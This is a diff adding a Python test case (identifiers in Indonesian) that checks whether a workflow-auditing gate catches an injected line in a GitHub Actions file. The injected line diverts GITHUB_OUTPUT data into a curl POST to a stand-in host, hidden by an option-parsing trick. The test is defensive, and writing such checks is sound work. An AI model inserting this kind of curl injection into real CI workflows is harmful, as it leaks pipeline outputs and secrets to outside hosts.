@@ -40229,6 +40229,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("singkatan opsi bernilai menelan --help (Audit 2827)", rc != 0)
         shutil.rmtree(sub1898, ignore_errors=True)
+        sub1899 = klon(tmp, "sub1899")
+        berkas_aksi1899 = os.path.join(
+            sub1899, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1899, encoding="utf-8") as f:
+            isi_aksi1899 = f.read()
+        baris_aksi1899 = [b for b in isi_aksi1899.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1899 = isi_aksi1899.replace(
+                baris_aksi1899,
+                baris_aksi1899.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -o --max-time -d @- http://127.0.0.1/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1899 != isi_aksi1899, \
+            "suntikan aksi1899 tidak menembak"
+        with open(berkas_aksi1899, "w", encoding="utf-8") as f:
+            f.write(isi_baru1899)
+        rc, out = jalan(sub1899,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl -o menelan --max-time sebagai nilainya (Audit 2828)", rc != 0)
+        shutil.rmtree(sub1899, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
